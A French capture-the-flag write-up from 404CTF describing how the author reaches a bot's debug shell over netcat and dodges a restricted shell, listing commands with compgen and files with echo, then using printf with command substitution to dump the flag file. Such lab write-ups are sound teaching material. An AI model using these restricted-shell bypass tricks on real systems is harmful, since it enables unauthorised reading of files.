# Un utilisatier Suscpicieux [2/2]

On continue de parler avec le précédent bot (Cf [un utilisateur suspicieux [1/2]](/Divers/Un%20Utilisateur%20Suspicieux%20%5B1%3A2%5D/README.md) )
:
la commande `!aide` nous offre, après authentification, une nouvelle commande : `!debug` :

```text
Debug déployé sur le port 31337 ! Mot de passe : p45_uN_4uT0m4t3
```

je me connecte avec `netcat` sur le serveur :

```shell
nc challenge.404ctf.fr 31337
```

- je liste toutes les commandes que je peux executer.

```shell
compgen -c
```

- je remarque que `echo` et `printf` sont accessibles.

je liste tous les fichiers présents dans le dossier dans lequel je me situe grâce à `echo`:

```shell
$ echo * 
auth_wall.sh flag.txt
```

- `auth_wall.sh` est probablement le script qui demande la mot de passe dès qu'on se connecte au serveur.
- `flag.txt` est probablement le fichier qui contient le flag.

j'utilise de manière détournée la commande `printf` pour afficher le contenu du fichier `flag.txt`

```shell
bash-4.4$ printf "%s" "$(<flag.txt)"
printf "%s" "$(<flag.txt)"
404CTF{17_s_4g155417_3n_f4iT_d_1_b0t}bash-4.4$ 
```

donc le flag est :
>404CTF{17_s_4g155417_3n_f4iT_d_1_b0t}
